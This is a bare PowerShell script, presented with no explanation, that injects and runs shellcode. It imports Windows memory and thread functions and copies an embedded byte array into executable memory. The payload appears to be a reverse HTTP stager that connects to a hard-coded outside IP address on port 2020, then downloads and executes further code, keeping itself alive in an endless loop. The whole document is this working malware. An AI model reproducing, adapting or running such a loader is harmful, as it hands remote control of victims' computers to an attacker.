$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xe4,0x07,0x00,0x00,0xe8,0x2d,0x01,0x00,0x00,0x2f,0x6d,0x42,0x55,0x63,0x6a,0x31,0x79,0x6a,0x43,0x73,0x6f,0x38,0x4a,0x6a,0x30,0x6e,0x61,0x6e,0x49,0x38,0x54,0x51,0x66,0x77,0x58,0x72,0x64,0x49,0x4d,0x59,0x7a,0x38,0x7a,0x45,0x6b,0x41,0x37,0x4a,0x78,0x34,0x67,0x61,0x63,0x47,0x42,0x64,0x37,0x6c,0x43,0x6e,0x2d,0x39,0x6c,0x53,0x54,0x39,0x76,0x54,0x66,0x6b,0x4f,0x62,0x72,0x4c,0x78,0x56,0x49,0x38,0x5a,0x64,0x46,0x4e,0x49,0x68,0x7a,0x66,0x36,0x6c,0x64,0x35,0x50,0x41,0x73,0x57,0x54,0x38,0x35,0x76,0x7a,0x4e,0x77,0x38,0x54,0x36,0x58,0x49,0x4d,0x49,0x48,0x56,0x57,0x78,0x50,0x56,0x6f,0x43,0x32,0x54,0x6a,0x58,0x69,0x55,0x64,0x41,0x43,0x70,0x68,0x41,0x2d,0x68,0x31,0x66,0x55,0x38,0x78,0x5a,0x68,0x65,0x74,0x36,0x46,0x30,0x75,0x55,0x34,0x38,0x30,0x39,0x51,0x36,0x6e,0x4e,0x72,0x42,0x7a,0x78,0x74,0x55,0x4c,0x64,0x66,0x76,0x4f,0x36,0x57,0x68,0x5a,0x50,0x31,0x43,0x68,0x44,0x66,0x46,0x75,0x46,0x39,0x61,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x48,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff,0x38,0x33,0x2e,0x34,0x2e,0x32,0x35,0x30,0x2e,0x32,0x39,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
